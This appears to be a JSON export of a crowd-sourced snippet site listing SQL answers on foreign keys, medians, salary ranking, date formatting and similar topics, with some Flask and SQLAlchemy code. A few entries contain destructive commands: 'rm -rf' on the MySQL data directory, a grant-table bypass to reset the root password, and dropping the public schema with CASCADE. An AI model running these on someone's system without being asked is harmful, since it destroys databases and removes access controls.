    "description": "SHOW VARIABLES LIKE \"%version%\"; +-------------------------+------------------------------------------+ | Variable_name           | Value                                    | +-------------------------+------------------------------------------+ | protocol_version        | 10                                       | | version                 | 5.0.27-standard                          | | version_comment         | MySQL Community Edition - Standard (GPL) | | version_compile_machine | i686                                     | | version_compile_os      | pc-linux-gnu                             | +-------------------------+------------------------------------------+ 5 rows in set (0.04 sec)\nmysql -V\n",
    "reg_date": "2021-10-12T09:55:18.000Z"
  },
  {
    "id": 1020,
    "keyword": null,
    "link": null,
    "title": " find nth highest salary of an employee",
    "description": "#Method 1 SELECT salary FROM Employee ORDER BY salary DESC LIMIT N-1, 1  #Method 2 SELECT salary FROM Employee AS e1  WHERE n-1=(SELECT COUNT(DISTINCT,salary) FROM Employee AS e2             WHERE e2.salary>e1.salary)\nSELECT salary FROM Employee ORDER BY salary DESC LIMIT N-1, 1\n",
    "reg_date": "2021-10-12T09:55:18.000Z"
  },
  {
    "id": 1021,
    "keyword": null,
    "link": null,
    "title": " find size of all DB's postgres",
    "description": "CopySELECT pg_database.datname as \"database_name\", pg_database_size(pg_database.datname)/1024/1024 AS size_in_mb FROM pg_database ORDER by size_in_mb DESC; \n",
    "reg_date": "2021-10-12T09:55:18.000Z"
  },
  {
    "id": 1022,
    "keyword": null,
    "link": null,
    "title": " find string in stored procedure sql server",
    "description": "SELECT name FROM   sys.procedures WHERE  Object_definition(object_id) LIKE '%strHell%'\nSELECT DISTINCT        o.name AS Object_Name,        o.type_desc   FROM sys.sql_modules m        INNER JOIN        sys.objects o          ON m.object_id = o.object_id  WHERE m.definition Like '%[ABD]%';\n",
    "reg_date": "2021-10-12T09:55:18.000Z"
  },
  {
    "id": 1023,
    "keyword": null,
    "link": null,
    "title": " find table from column name in sql",
    "description": "SELECT      c.name  AS 'ColumnName'             ,t.name AS 'TableName' FROM        sys.columns c JOIN        sys.tables  t   ON c.object_id = t.object_id WHERE       c.name LIKE '%MyName%' ORDER BY    TableName             ,ColumnName;\n",
    "reg_date": "2021-10-12T09:55:18.000Z"
  },
  {
    "id": 1024,
    "keyword": null,
    "link": null,
    "title": " find tables with column name in sql",
    "description": "SELECT * FROM USER_TAB_COLUMNS WHERE COLUMN_NAME = 'MY_COLUMN'; -- Connected user SELECT * FROM ALL_TAB_COLUMNS WHERE COLUMN_NAME = 'MY_COLUMN';\t-- Other schemas SELECT * FROM DBA_TAB_COLUMNS WHERE COLUMN_NAME = 'MY_COLUMN';\t-- All tables\n",
    "reg_date": "2021-10-12T09:55:18.000Z"
  },
  {
    "id": 1025,
    "keyword": null,
    "link": null,
    "title": " find the median in sql",
    "description": "# FOR TABLES WITH ODD NUMBER OF ROWS  # For column1 in table1 with 'n' number of rows. Where 'n' is an odd number. # 1. Change all column1 and table1 to your column and table name. # 2. Calculate (n/2)+0.5, where n=number of rows, and set it as LIMIT for t1.  SELECT * FROM (SELECT column1       FROM table1       ORDER BY column1       LIMIT (n/2)+0.5) AS t1 ORDER BY column1 DESC LIMIT 1;\n# FOR TABLES WITH EVEN NUMBER OF ROWS  # For column1 in table1 with 'n' number of rows. Where 'n' is an even number. # 1. Change all column1 and table1 to your column and table name. # 2. Calculate (n/2)+1, where n=number of rows, and set it as LIMIT for t1.  SELECT AVG(t2.column1) FROM (SELECT * \tFROM (SELECT column1       \tFROM table1      \t ORDER BY column1      \t LIMIT (n/2)+1) AS t1 \tORDER BY column1 DESC \tLIMIT 2) AS t2;\nSET @rowindex := -1;   SELECT    AVG(g.grade) FROM    (SELECT @rowindex:=@rowindex + 1 AS rowindex,            grades.grade AS grade     FROM grades     ORDER BY grades.grade) AS g WHERE g.rowindex IN (FLOOR(@rowindex / 2) , CEIL(@rowindex / 2)); \n",
    "reg_date": "2021-10-12T09:55:18.000Z"
  },
  {
    "id": 1026,
    "keyword": null,
    "link": null,
    "title": " find value if not null in sql",
    "description": "SELECT FIRST_NAME , MANAGER_ID  FROM EMPLOYEES  WHERE MANAGER_ID IS NOT NULL ;\n",
    "reg_date": "2021-10-12T09:55:18.000Z"
  },
  {
    "id": 1027,
    "keyword": null,
    "link": null,
    "title": " find wordpress version in database",
    "description": "/* Make sure to consult the codex, as the db_version looks different from the wp version. */ /* https://codex.wordpress.org/WordPress_Versions */ SELECT * FROM `wp_options` where option_name = 'db_version'\n",
    "reg_date": "2021-10-12T09:55:18.000Z"
  },
  {
    "id": 1028,
    "keyword": null,
    "link": null,
    "title": " finding duplicate column values in table with sql",
    "description": "SELECT username, email, COUNT(*) FROM users GROUP BY username, email HAVING COUNT(*) > 1 \nSELECT name, COUNT(email)  FROM users GROUP BY email HAVING COUNT(email) > 1\ndeclare @YourTable table (id int, name varchar(10), email varchar(50))  INSERT @YourTable VALUES (1,'John','John-email') INSERT @YourTable VALUES (2,'John','John-email') INSERT @YourTable VALUES (3,'fred','John-email') INSERT @YourTable VALUES (4,'fred','fred-email') INSERT @YourTable VALUES (5,'sam','sam-email') INSERT @YourTable VALUES (6,'sam','sam-email')  SELECT     name,email, COUNT(*) AS CountOf     FROM @YourTable     GROUP BY name,email     HAVING COUNT(*)>1\n",
    "reg_date": "2021-10-12T09:55:19.000Z"
  },
  {
    "id": 1029,
    "keyword": null,
    "link": null,
    "title": " firebase bigquery cloud message",
    "description": "SELECT * FROM `<project_name>.firebase_messaging.data` WHERE    _PARTITIONTIME = TIMESTAMP('<date as YYYY-MM-DD>')    AND message_id = '<your message id>'    AND instance_id = '<your instance id>' ORDER BY event_timestamp;\n",
    "reg_date": "2021-10-12T09:55:19.000Z"
  },
  {
    "id": 1030,
    "keyword": null,
    "link": null,
    "title": " first letter capital in mysql query",
    "description": "UPDATE tb_Company SET CompanyIndustry = CONCAT(UCASE(LEFT(CompanyIndustry, 1)),                               LCASE(SUBSTRING(CompanyIndustry, 2)));\nselect initcap(\"hometown\")                     hometown, is the column name FROM benn.college_football_players\n",
    "reg_date": "2021-10-12T09:55:19.000Z"
  },
  {
    "id": 1031,
    "keyword": null,
    "link": null,
    "title": " fk in insert mysql",
    "description": "INSERT INTO joke(joke_text, joke_date, author_id) VALUES (&lsquo;Humpty Dumpty had a great fall.&rsquo;, &lsquo;1899&ndash;03&ndash;13&rsquo;,          (SELECT id FROM author WHERE author_name = &lsquo;Famous Anthony&rsquo;));\n",
    "reg_date": "2021-10-12T09:55:19.000Z"
  },
  {
    "id": 1032,
    "keyword": null,
    "link": null,
    "title": " flask-sqlalchemy filter by contains",
    "description": "games = Game.query.filter(Game.players.contains(p)).order_by(Game.some_field).all()\n",
    "reg_date": "2021-10-12T09:55:19.000Z"
  },
  {
    "id": 1033,
    "keyword": null,
    "link": null,
    "title": " flask mysql",
    "description": "from flask import Flask, render_template, request from flask_mysqldb import MySQL app = Flask(__name__)   app.config['MYSQL_HOST'] = 'localhost' app.config['MYSQL_USER'] = 'root' app.config['MYSQL_PASSWORD'] = 'root' app.config['MYSQL_DB'] = 'MyDB'  mysql = MySQL(app)   @app.route('/', methods=['GET', 'POST']) def index():     if request.method == \"POST\":         details = request.form         firstName = details['fname']         lastName = details['lname']         cur = mysql.connection.cursor()         cur.execute(\"INSERT INTO MyUsers(firstName, lastName) VALUES (%s, %s)\", (firstName, lastName))         mysql.connection.commit()         cur.close()         return 'success'     return render_template('index.html')   if __name__ == '__main__':     app.run() \nfrom flask import Flask, render_template, request from flask_mysqldb import MySQL app = Flask(__name__)   app.config['MYSQL_HOST'] = 'localhost' app.config['MYSQL_USER'] = 'root' app.config['MYSQL_PASSWORD'] = 'root' app.config['MYSQL_DB'] = 'MyDB'  mysql = MySQL(app)   @app.route('/', methods=['GET', 'POST']) def index():     if request.method == \"POST\":         details = request.form         firstName = details['fname']         lastName = details['lname']         cur = mysql.connection.cursor()         cur.execute(\"INSERT INTO MyUsers(firstName, lastName) VALUES (%s, %s)\", (firstName, lastName))         mysql.connection.commit()         cur.close()         return 'success'     return render_template('index.html')   if __name__ == '__main__':     app.run()\n",
    "reg_date": "2021-10-12T09:55:19.000Z"
  },
  {
    "id": 1034,
    "keyword": null,
    "link": null,
    "title": " float postgres",
    "description": "CREATE TABLE float_point (floatn FLOAT4); \t      -- precision min 4, maximum 8 INSERT INTO float_point (floatn) VALUES (543.23); -- 543,23 CREATE TABLE float_point_r (real_no REAL); \t\t  -- 1E-37 to 1E+37, 6 decimal max INSERT INTO float_point_r (real_no) VALUES (12345623); -- 1,234562&euro;+07\n",
    "reg_date": "2021-10-12T09:55:19.000Z"
  },
  {
    "id": 1035,
    "keyword": null,
    "link": null,
    "title": " flutter sqlite auto incrementing id primary key",
    "description": "db.execSQL(\"create table \" + TABLE__WORK + \" (ID INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,Name TEXT, Title TEXT, Time TEXT, Date TEXT)\"); \n",
    "reg_date": "2021-10-12T09:55:19.000Z"
  },
  {
    "id": 1036,
    "keyword": null,
    "link": null,
    "title": " for cursor plsql",
    "description": "FOR record_name IN cursor_name LOOP  \tstatement1;  \tstatement2;  \t. . .  END LOOP;\n",
    "reg_date": "2021-10-12T09:55:19.000Z"
  },
  {
    "id": 1037,
    "keyword": null,
    "link": null,
    "title": " for loop postgresql",
    "description": "FOR r IN SELECT * FROM foo     WHERE fooid > 0     LOOP         -- can do some processing here         RETURN NEXT r; -- return current row of SELECT     END LOOP;\n",
    "reg_date": "2021-10-12T09:55:19.000Z"
  },
  {
    "id": 1038,
    "keyword": null,
    "link": null,
    "title": " for plsql",
    "description": "FOR contatore IN lower bound..upper bound LOOP  \t... END LOOP;\n",
    "reg_date": "2021-10-12T09:55:20.000Z"
  },
  {
    "id": 1039,
    "keyword": null,
    "link": null,
    "title": " for select oracle",
    "description": "FOR <Loop_index> IN (<Select_statement>) LOOP      <Executable_statements>;  END LOOP [<Loop_index>];\n                                     FOR record IN cursor_name LOOP     process_record_statements; END LOOP; \n",
    "reg_date": "2021-10-12T09:55:20.000Z"
  },
  {
    "id": 1040,
    "keyword": null,
    "link": null,
    "title": " force drop all tables postgres",
    "description": "DROP SCHEMA public CASCADE; CREATE SCHEMA public;\n",
    "reg_date": "2021-10-12T09:55:20.000Z"
  },
  {
    "id": 1041,
    "keyword": null,
    "link": null,
    "title": " foreign key",
    "description": "Schema::table('posts', function (Blueprint $table) {     $table->unsignedBigInteger('user_id');      $table->foreign('user_id')->references('id')->on('users'); }); OR Schema::table('posts', function (Blueprint $table) {     $table->foreignId('user_id')->constrained(); });\nALTER TABLE table_name DROP CONSTRAINT fk_name;\n# A foreign key is essentially a reference to a primary # key in another table.  # A Simple table of Users,  CREATE TABLE users( \tuserId INT NOT NULL,   \tusername VARCHAR(64) NOT NULL,   \tpasswd VARCHAR(32) NOT NULL,   \tPRIMARY KEY(userId); ); # Lets add a LEGIT user! INSERT INTO users VALUES(1000,\"Terry\",\"Teabagface$2\");  # We will create an order table that holds a reference # to an order made by our Terry CREATE TABLE orders( \torderId INT NOT NULL,   \torderDescription VARCHAR(255),   \tordererId INT NOT NULL,   \tPRIMARY KEY(orderId),   \tFOREIGN KEY (ordererId) REFERENCES users(userId) ); # Now we can add an order from Terry INSERT INTO orders VALUES(0001,\"Goat p0rn Weekly\",1000);  # Want to know more about the plight of Goats? # See the link below\nA FOREIGN KEY is a key used to link two tables together. A FOREIGN KEY is a field (or collection of fields) in one table that refers to the PRIMARY KEY in another table. The table containing the foreign key is called the child table, and the table containing the candidate key is called the referenced or parent table.  Example: # creating table users CREATE TABLE users( \tuser_id INT NOT NULL,   \tuser_name VARCHAR(64) NOT NULL,   \tuser_pass VARCHAR(32) NOT NULL,   \tPRIMARY KEY(user_id); ); # adding user data INSERT INTO users VALUES(1,\"Raj\",\"raj@123\");  # creating table orders CREATE TABLE orders( \torder_id INT NOT NULL,   \torder_description VARCHAR(255),   \torderer_id INT NOT NULL,   \tPRIMARY KEY(order_id),   \tFOREIGN KEY (orderer_id) REFERENCES users(user_id) ); # adding order data INSERT INTO orders VALUES(1,\"Daily groceries\",1);\nCREATE TABLE Employee(     EmployeeID int NOT NULL,     LastName varchar(50) NOT NULL,     FirstName varchar(20) NOT NULL,     Age int,     DeptNo int,     PRIMARY KEY (EmployeeID),     FOREIGN KEY (DeptNo) REFERENCES Department(DeptNo) ); \nForeign Key:  It is a column that comes from a different table and using Foreign key tables are related each other It is the primary key of another table It can be duplicate or null for another table   Primary Key : It is unique column in every table in a database It can ONLY accept;     - nonduplicate values     - cannot be NULL  Unique Key: Only unique value and also can contain NULL\n",
    "reg_date": "2021-10-12T09:55:20.000Z"
  },
  {
    "id": 1042,
    "keyword": null,
    "link": null,
    "title": " foreign key constraint",
    "description": "-- On Create CREATE TABLE tableName (     ID INT,     SomeEntityID INT,     PRIMARY KEY (ID),     FOREIGN KEY (SomeEntityID)         REFERENCES SomeEntityTable(ID)         ON DELETE CASCADE );  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;     -- Add FK with a specific name  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD CONSTRAINT fk_name   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;\nALTER TABLE Orders ADD CONSTRAINT FK_PersonOrder FOREIGN KEY (PersonID) REFERENCES Persons(PersonID);\n# A foreign key is essentially a reference to a primary # key in another table.  # A Simple table of Users,  CREATE TABLE users( \tuserId INT NOT NULL,   \tusername VARCHAR(64) NOT NULL,   \tpasswd VARCHAR(32) NOT NULL,   \tPRIMARY KEY(userId); ); # Lets add a LEGIT user! INSERT INTO users VALUES(1000,\"Terry\",\"Teabagface$2\");  # We will create an order table that holds a reference # to an order made by our Terry CREATE TABLE orders( \torderId INT NOT NULL,   \torderDescription VARCHAR(255),   \tordererId INT NOT NULL,   \tPRIMARY KEY(orderId),   \tFOREIGN KEY (ordererId) REFERENCES users(userId) ); # Now we can add an order from Terry INSERT INTO orders VALUES(0001,\"Goat p0rn Weekly\",1000);  # Want to know more about the plight of Goats? # See the link below\nA FOREIGN KEY is a key used to link two tables together. A FOREIGN KEY is a field (or collection of fields) in one table that refers to the PRIMARY KEY in another table. The table containing the foreign key is called the child table, and the table containing the candidate key is called the referenced or parent table.  Example: # creating table users CREATE TABLE users( \tuser_id INT NOT NULL,   \tuser_name VARCHAR(64) NOT NULL,   \tuser_pass VARCHAR(32) NOT NULL,   \tPRIMARY KEY(user_id); ); # adding user data INSERT INTO users VALUES(1,\"Raj\",\"raj@123\");  # creating table orders CREATE TABLE orders( \torder_id INT NOT NULL,   \torder_description VARCHAR(255),   \torderer_id INT NOT NULL,   \tPRIMARY KEY(order_id),   \tFOREIGN KEY (orderer_id) REFERENCES users(user_id) ); # adding order data INSERT INTO orders VALUES(1,\"Daily groceries\",1);\nCREATE TABLE orders ( id int NOT NULL, user_id int, product_id int, PRIMARY KEY (id), FOREIGN KEY (user_id) REFERENCES users(id), FOREIGN KEY (product_id) REFERENCES products(id) );\nCREATE TABLE Students ( \t /* Create table with foreign key - Way 1 */     ID INT NOT NULL     Name VARCHAR(255)     LibraryID INT     PRIMARY KEY (ID)     FOREIGN KEY (Library_ID) REFERENCES Library(LibraryID) );  CREATE TABLE Students ( \t /* Create table with foreign key - Way 2 */     ID INT NOT NULL PRIMARY KEY     Name VARCHAR(255)     LibraryID INT FOREIGN KEY (Library_ID) REFERENCES Library(LibraryID) );   ALTER TABLE Students \t /* Add a new foreign key */ ADD FOREIGN KEY (LibraryID) REFERENCES Library (LibraryID); \n",
    "reg_date": "2021-10-12T09:55:20.000Z"
  },
  {
    "id": 1043,
    "keyword": null,
    "link": null,
    "title": " foreign key constraint in ms sql",
    "description": "/*Creating Foreign Key Constraint*/ ALTER TABLE ForeignKeyTable ADD CONSTRAINT ForeignKeyTable_foreignKeyColumn_FK FOREIGN KEY (foreignKeyColumn) REFERENCES PrimaryKeyTable (PrimaryKeyColumn)\n",
    "reg_date": "2021-10-12T09:55:20.000Z"
  },
  {
    "id": 1044,
    "keyword": null,
    "link": null,
    "title": " foreign key in sql",
    "description": "-- On Create CREATE TABLE tableName (     ID INT,     SomeEntityID INT,     PRIMARY KEY (ID),     FOREIGN KEY (SomeEntityID)         REFERENCES SomeEntityTable(ID)         ON DELETE CASCADE );  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;     -- Add FK with a specific name  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD CONSTRAINT fk_name   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;\n# A foreign key is essentially a reference to a primary # key in another table.  # A Simple table of Users,  CREATE TABLE users( \tuserId INT NOT NULL,   \tusername VARCHAR(64) NOT NULL,   \tpasswd VARCHAR(32) NOT NULL,   \tPRIMARY KEY(userId); ); # Lets add a LEGIT user! INSERT INTO users VALUES(1000,\"Terry\",\"Teabagface$2\");  # We will create an order table that holds a reference # to an order made by our Terry CREATE TABLE orders( \torderId INT NOT NULL,   \torderDescription VARCHAR(255),   \tordererId INT NOT NULL,   \tPRIMARY KEY(orderId),   \tFOREIGN KEY (ordererId) REFERENCES users(userId) ); # Now we can add an order from Terry INSERT INTO orders VALUES(0001,\"Goat p0rn Weekly\",1000);  # Want to know more about the plight of Goats? # See the link below\nA FOREIGN KEY is a key used to link two tables together. A FOREIGN KEY is a field (or collection of fields) in one table that refers to the PRIMARY KEY in another table. The table containing the foreign key is called the child table, and the table containing the candidate key is called the referenced or parent table.  Example: # creating table users CREATE TABLE users( \tuser_id INT NOT NULL,   \tuser_name VARCHAR(64) NOT NULL,   \tuser_pass VARCHAR(32) NOT NULL,   \tPRIMARY KEY(user_id); ); # adding user data INSERT INTO users VALUES(1,\"Raj\",\"raj@123\");  # creating table orders CREATE TABLE orders( \torder_id INT NOT NULL,   \torder_description VARCHAR(255),   \torderer_id INT NOT NULL,   \tPRIMARY KEY(order_id),   \tFOREIGN KEY (orderer_id) REFERENCES users(user_id) ); # adding order data INSERT INTO orders VALUES(1,\"Daily groceries\",1);\nALTER TABLE tryholpz_demo07.core_modules  ADD COLUMN belongs_to_role INT,  ADD FOREIGN KEY core_modules(belongs_to_role) REFERENCES role_specific_modules_info(id) ON DELETE CASCADE\nCREATE TABLE Students ( \t /* Create table with foreign key - Way 1 */     ID INT NOT NULL     Name VARCHAR(255)     LibraryID INT     PRIMARY KEY (ID)     FOREIGN KEY (Library_ID) REFERENCES Library(LibraryID) );  CREATE TABLE Students ( \t /* Create table with foreign key - Way 2 */     ID INT NOT NULL PRIMARY KEY     Name VARCHAR(255)     LibraryID INT FOREIGN KEY (Library_ID) REFERENCES Library(LibraryID) );   ALTER TABLE Students \t /* Add a new foreign key */ ADD FOREIGN KEY (LibraryID) REFERENCES Library (LibraryID); \nForeign Key:  It is a column that comes from a different table and using Foreign key tables are related each other It is the primary key of another table It can be duplicate or null for another table   Primary Key : It is unique column in every table in a database It can ONLY accept;     - nonduplicate values     - cannot be NULL  Unique Key: Only unique value and also can contain NULL\n",
    "reg_date": "2021-10-12T09:55:20.000Z"
  },
  {
    "id": 1045,
    "keyword": null,
    "link": null,
    "title": " foreign key mssql",
    "description": "A FOREIGN KEY is a key used to link two tables together. A FOREIGN KEY is a field (or collection of fields) in one table that refers to the PRIMARY KEY in another table. The table containing the foreign key is called the child table, and the table containing the candidate key is called the referenced or parent table.  Example: # creating table users CREATE TABLE users( \tuser_id INT NOT NULL,   \tuser_name VARCHAR(64) NOT NULL,   \tuser_pass VARCHAR(32) NOT NULL,   \tPRIMARY KEY(user_id); ); # adding user data INSERT INTO users VALUES(1,\"Raj\",\"raj@123\");  # creating table orders CREATE TABLE orders( \torder_id INT NOT NULL,   \torder_description VARCHAR(255),   \torderer_id INT NOT NULL,   \tPRIMARY KEY(order_id),   \tFOREIGN KEY (orderer_id) REFERENCES users(user_id) ); # adding order data INSERT INTO orders VALUES(1,\"Daily groceries\",1);\nCREATE TABLE Sales.TempSalesReason     (       TempID int NOT NULL, Name nvarchar(50)       , CONSTRAINT PK_TempSales PRIMARY KEY NONCLUSTERED (TempID)       , CONSTRAINT FK_TempSales_SalesReason FOREIGN KEY (TempID)         REFERENCES Sales.SalesReason (SalesReasonID)         ON DELETE CASCADE         ON UPDATE CASCADE    ) ; \n/*Creating Foreign Key Constraint*/ ALTER TABLE ForeignKeyTable ADD CONSTRAINT ForeignKeyTable_foreignKeyColumn_FK FOREIGN KEY (foreignKeyColumn) REFERENCES PrimaryKeyTable (PrimaryKeyColumn)\n",
    "reg_date": "2021-10-12T09:55:21.000Z"
  },
  {
    "id": 1046,
    "keyword": null,
    "link": null,
    "title": " foreign key mySql",
    "description": "ALTER TABLE table_name DROP CONSTRAINT fk_name;\n-- On Create CREATE TABLE tableName (     ID INT,     SomeEntityID INT,     PRIMARY KEY (ID),     FOREIGN KEY (SomeEntityID)         REFERENCES SomeEntityTable(ID)         ON DELETE CASCADE );  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;     -- Add FK with a specific name  -- On Alter, if the column already exists but has no FK ALTER TABLE   tableName ADD CONSTRAINT fk_name   FOREIGN KEY (SomeEntityID) REFERENCES SomeEntityTable(ID) ON DELETE CASCADE;\nCREATE TABLE parent (     id INT NOT NULL,     PRIMARY KEY (id) ) ENGINE=INNODB;  CREATE TABLE child (     id INT,     parent_id INT,     INDEX par_ind (parent_id),     FOREIGN KEY (parent_id)         REFERENCES parent(id)         ON DELETE CASCADE ) ENGINE=INNODB;\n                                     CREATE TABLE products(     productId INT AUTO_INCREMENT PRIMARY KEY,     productName varchar(100) not null,     categoryId INT NOT NULL,     CONSTRAINT fk_category     FOREIGN KEY (categoryId)      REFERENCES categories(categoryId)         ON UPDATE CASCADE         ON DELETE CASCADE ) ENGINE=INNODB;\nALTER TABLE tryholpz_demo07.core_modules  ADD COLUMN belongs_to_role INT,  ADD FOREIGN KEY core_modules(belongs_to_role) REFERENCES role_specific_modules_info(id) ON DELETE CASCADE\nALTER TABLE database.table   ADD COLUMN columnname INT DEFAULT(1),   ADD FOREIGN KEY fk_name(fk_column) REFERENCES reftable(refcolumn) ON DELETE CASCADE;\n",
    "reg_date": "2021-10-12T09:55:21.000Z"
  },
  {
    "id": 1047,
    "keyword": null,
    "link": null,
    "title": " foreign key not null constraint",
    "description": " create table orders (         ord_no numeric (5) ,          purch_amt decimal(8,2),          ord_date date,          customer_id numeric (5) ,                  salesman_id numeric(5)                   foreign key(salesman_id)          references salesman (salesman_id) ) go\n",
    "reg_date": "2021-10-12T09:55:21.000Z"
  },
  {
    "id": 1048,
    "keyword": null,
    "link": null,
    "title": " foreign key on table oracle",
    "description": "SELECT c.OWNER, a.TABLE_NAME, a.COLUMN_NAME, a.CONSTRAINT_NAME,         c.R_OWNER AS REF_OWNER, cpk.TABLE_NAME AS REF_TABLE,         cpk.CONSTRAINT_NAME AS REF_PK FROM ALL_CONS_COLUMNS a  JOIN ALL_CONSTRAINTS c ON a.OWNER = c.OWNER     AND a.CONSTRAINT_NAME = c.CONSTRAINT_NAME  JOIN ALL_CONSTRAINTS cpk ON c.R_OWNER = cpk.OWNER     AND c.R_CONSTRAINT_NAME = cpk.CONSTRAINT_NAME WHERE c.CONSTRAINT_TYPE = 'R' AND c.TABLE_NAME= 'table_name';\nCREATE TABLE hr.admin_emp (          empno      NUMBER(5) PRIMARY KEY,          ename      VARCHAR2(15) NOT NULL,          ssn        NUMBER(9) ENCRYPT,          job        VARCHAR2(10),          mgr        NUMBER(5),          hiredate   DATE DEFAULT (sysdate),          photo      BLOB,          sal        NUMBER(7,2),          hrly_rate  NUMBER(7,2) GENERATED ALWAYS AS (sal/2080),          comm       NUMBER(7,2),          deptno     NUMBER(3) NOT NULL                      CONSTRAINT admin_dept_fkey REFERENCES hr.departments                      (department_id))\n",
    "reg_date": "2021-10-12T09:55:21.000Z"
  },
  {
    "id": 1049,
    "keyword": null,
    "link": null,
    "title": " foreign key plsql",
    "description": "CREATE TABLE supplier ( supplier_id numeric(10) not null,   supplier_name varchar2(50) not null,   contact_name varchar2(50),   CONSTRAINT supplier_pk PRIMARY KEY (supplier_id) );  CREATE TABLE products ( product_id numeric(10) not null,   supplier_id numeric(10) not null,   CONSTRAINT fk_supplier     FOREIGN KEY (supplier_id)     REFERENCES supplier(supplier_id) );\n",
    "reg_date": "2021-10-12T09:55:21.000Z"
  },
  {
    "id": 1050,
    "keyword": null,
    "link": null,
    "title": " foreign key set 0",
    "description": "SET FOREIGN_KEY_CHECKS=0; \n   -- Specify to check foreign key constraints (this is the default)     SET FOREIGN_KEY_CHECKS = 1;      -- Do not check foreign key constraints     SET FOREIGN_KEY_CHECKS = 0;\n",
    "reg_date": "2021-10-12T09:55:21.000Z"
  },
  {
    "id": 1051,
    "keyword": null,
    "link": null,
    "title": " foreign key sqlalchemy",
    "description": "class Parent(Base):     __tablename__ = 'parent'     id = Column(Integer, primary_key=True)     children = relationship(\"Child\", back_populates=\"parent\")  class Child(Base):     __tablename__ = 'child'     id = Column(Integer, primary_key=True)     parent_id = Column(Integer, ForeignKey('parent.id'))     parent = relationship(\"Parent\", back_populates=\"children\")\nassociation_table = Table('association', Base.metadata,     Column('left_id', Integer, ForeignKey('left.id')),     Column('right_id', Integer, ForeignKey('right.id')) )  class Parent(Base):     __tablename__ = 'left'     id = Column(Integer, primary_key=True)     children = relationship(         \"Child\",         secondary=association_table,         back_populates=\"parents\")  class Child(Base):     __tablename__ = 'right'     id = Column(Integer, primary_key=True)     parents = relationship(         \"Parent\",         secondary=association_table,         back_populates=\"children\")\nt = Table(\"remote_table\", metadata,     Column(\"remote_id\", ForeignKey(\"main_table.id\")) )\n",
    "reg_date": "2021-10-12T09:55:21.000Z"
  },
  {
    "id": 1052,
    "keyword": null,
    "link": null,
    "title": " forge server hosting",
    "description": "Top Free Providers: Aternos provides 2 free 2gb RAM servers  Best Cheap Provider: Jeekie.Host is one of the cheapest hosting companies in the industry with prices starting at &euro;0.60/gb. - https://jeekie.host/\n",
    "reg_date": "2021-10-12T09:55:21.000Z"
  },
  {
    "id": 1053,
    "keyword": null,
    "link": null,
    "title": " forgot my mysql password mac",
    "description": "MacOSX MySql root Password Reset master solution Step by step guide- $ brew services stop mysql $ pkill mysqld $ rm -rf /usr/local/var/mysql/ # NOTE: this will delete your existing database!!! $ brew postinstall mysql $ brew services restart mysql $ mysql -u root\nMake sure you have Stopped MySQL first (above). Run the server in safe mode with privilege bypass: sudo mysqld_safe --skip-grant-tables mysql -u root UPDATE mysql.user SET authentication_string=null WHERE User='root'; FLUSH PRIVILEGES; exit; Then mysql -u root ALTER USER 'root'@'localhost' IDENTIFIED WITH caching_sha2_password BY 'yourpasswd';\n",
    "reg_date": "2021-10-12T09:55:22.000Z"
  },
  {
    "id": 1054,
    "keyword": null,
    "link": null,
    "title": " format the money fied with comma in international system using sql",
    "description": "select FORMAT(123456789,'#,#.00')  --> 123,456,789.75  select FORMAT(1500350.75, 'c','en-au')\n",
    "reg_date": "2021-10-12T09:55:22.000Z"
  },
  {
    "id": 1055,
    "keyword": null,
    "link": null,
    "title": " format time mysql",
    "description": "DATE_FORMAT(date, format) -- E.g. SELECT DATE_FORMAT(dateField, '%m/%d/%Y') FROM TableName; -- See https://www.mysqltutorial.org/mysql-date_format/ for available formats\n-- use DATE_FORMAT with %H %i -- SELECT DATE_FORMAT(MemberBookFacility.time, '%H:%i') \"45\": \"09:00\", \"24\": \"10:00\", \"42\": \"11:00\", \"48\": \"12:00\",  -- ONcakephp must use below format $this->virtualFields['time'] = \"DATE_FORMAT(MemberBookFacility.time, '%H:%i')\";\t// using this for use concat \t \t\treturn $this->find('list', array(           'conditions' => $conditions,           'fields' => array(             'MemberBookFacility.id',              'time',           ),           'order' => array(             'MemberBookFacility.time ASC',           ),         ));\nhh:ii:ss\n",
    "reg_date": "2021-10-12T09:55:22.000Z"
  },
  {
    "id": 1056,
    "keyword": null,
    "link": null,
    "title": " full-text index mysql",
    "description": "-- examble to create fulltext index on posts table on blog  CREATE FULLTEXT INDEX IF NOT EXISTS idx_title_body ON     posts(title, body);      SELECT     * FROM     posts WHERE     MATCH(title, body) AGAINST(\"search words\" IN BOOLEAN MODE);\nCREATE FULLTEXT INDEX IF NOT EXISTS idx_col1_col2 ON     tableName(col1, col2);      SELECT     * FROM     tableName WHERE     MATCH(col1, col2) AGAINST(\"search words\");\n",
    "reg_date": "2021-10-12T09:55:22.000Z"
  },
  {
    "id": 1057,
    "keyword": null,
    "link": null,
    "title": " full outer join in mariadb mysql",
    "description": "SELECT * FROM t1 LEFT JOIN t2 ON t1.id = t2.id UNION SELECT * FROM t1 RIGHT JOIN t2 ON t1.id = t2.id\n",
    "reg_date": "2021-10-12T09:55:22.000Z"
  },
  {
    "id": 1058,
    "keyword": null,
    "link": null,
    "title": " full sql mode",
    "description": "mysql > SET GLOBAL sql_mode=(SELECT REPLACE(@@sql_mode,'ONLY_FULL_GROUP_BY','')); \n",
    "reg_date": "2021-10-12T09:55:22.000Z"
  },
  {
    "id": 1059,
    "keyword": null,
    "link": null,
    "title": " function difference in hours(timestamp with time zone) does not exist",
    "description": "-- use cast  colum::timestamp\n",
    "reg_date": "2021-10-12T09:55:22.000Z"
  },
  {
    "id": 1060,
    "keyword": null,
    "link": null,
    "title": " function in plsql",
